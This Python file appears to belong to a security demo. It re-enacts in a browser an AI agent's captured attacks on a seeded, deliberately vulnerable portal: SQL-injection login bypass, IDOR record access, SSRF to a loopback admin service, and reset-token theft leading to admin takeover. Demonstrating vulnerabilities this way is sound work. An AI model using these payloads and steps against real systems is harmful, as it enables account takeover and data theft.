"""Per-technique browser re-enactment of the agent's REAL winning payload.

Each function receives a live PortalBrowser and the real payload(s) the agent
chose during the run, and drives the portal UI so the attack is visible on
screen. The page changes because the real request really succeeds.
"""

from __future__ import annotations

from demo.portal import seed_data as seed
from demo.visualizer.browser import PortalBrowser


def sqli_visual(browser: PortalBrowser, username_payload: str, password: str = "x") -> None:
    """Type the agent's real SQL-injection payload into the login form; land in
    the admin dashboard."""
    browser.login_ui(username_payload, password, settle=1.8)
    browser.pause(2.8)  # let the admin dashboard render and sit for the camera


def idor_visual(browser: PortalBrowser, victim_case_id: int) -> None:
    """Log in as an ordinary applicant, then view another applicant's case id —
    exposing their confidential record (no ownership check)."""
    browser.login_ui(seed.APPLICANT_USERNAME, seed.APPLICANT_PASSWORD, settle=1.2)
    browser.pause(1.5)  # we're on our own dashboard — let the viewer see it
    browser.nav_click("a.navlink[href='/application']")  # visibly click through to the case viewer
    browser.type_into("#caseId", str(victim_case_id))
    browser.pause(0.9)  # let the viewer read the swapped-in case id before it fires
    browser.click("#viewBtn")
    browser.pause(3.0)  # hold on the leaked record


def ssrf_visual(browser: PortalBrowser, internal_url: str) -> None:
    """Log in, open the link-preview tool, and submit the agent's real internal
    URL — the server fetches the loopback-only admin service."""
    browser.login_ui(seed.APPLICANT_USERNAME, seed.APPLICANT_PASSWORD, settle=1.2)
    browser.pause(1.5)  # we're on our own dashboard — let the viewer see it
    browser.nav_click("a.navlink[href='/link-preview']")  # visibly click through to the preview tool
    browser.type_into("#url", internal_url)
    browser.pause(0.9)  # let the viewer read the internal URL before it fires
    browser.click("#previewBtn")
    browser.pause(3.0)  # hold on the leaked internal admin page


def chain_visual(browser: PortalBrowser, admin_request_id: int, stolen_token: str) -> None:
    """Two-step chain: look up the admin's reset request (leaks the token),
    then reuse that token to complete an admin takeover."""
    browser.login_ui(seed.APPLICANT_USERNAME, seed.APPLICANT_PASSWORD, settle=1.0)
    browser.pause(1.5)  # we're on our own dashboard — let the viewer see it
    browser.nav_click("a.navlink[href='/recovery']")  # visibly click through to account recovery
    # Step A: enumerate to the admin's reset request -> token leaks and auto-fills.
    browser.type_into("#reqId", str(admin_request_id))
    browser.pause(0.8)
    browser.click("#lookupBtn")
    browser.pause(2.6)  # hold on the leaked reset token
    # Step B: reuse the stolen token to take over the admin account.
    # (lookup auto-fills #token; set it explicitly to the agent's real token too.)
    browser.type_into("#token", stolen_token)
    browser.pause(0.8)
    browser.click("#completeBtn")
    browser.pause(3.2)  # hold on the admin takeover — the finale


# Map a technique id -> a callable(browser, payloads_dict). The orchestrator
# pulls the real payload out of the captured run and calls the right one.
def run_visual(browser: PortalBrowser, technique_id: str, payloads: dict) -> None:
    if technique_id == "sql_injection":
        sqli_visual(browser, payloads.get("username", "' OR '1'='1' -- "), payloads.get("password", "x"))
    elif technique_id == "idor":
        idor_visual(browser, int(payloads.get("ticket_id", 2)))
    elif technique_id == "ssrf":
        ssrf_visual(browser, payloads.get("url", "http://127.0.0.1:6000/admin-metadata"))
    elif technique_id in ("token_leak", "account_takeover", "chain"):
        chain_visual(browser, int(payloads.get("request_id", 1)),
                     payloads.get("reset_token", seed.ADMIN_RESET_TOKEN))
    else:
        raise ValueError(f"no visual mapping for technique {technique_id!r}")
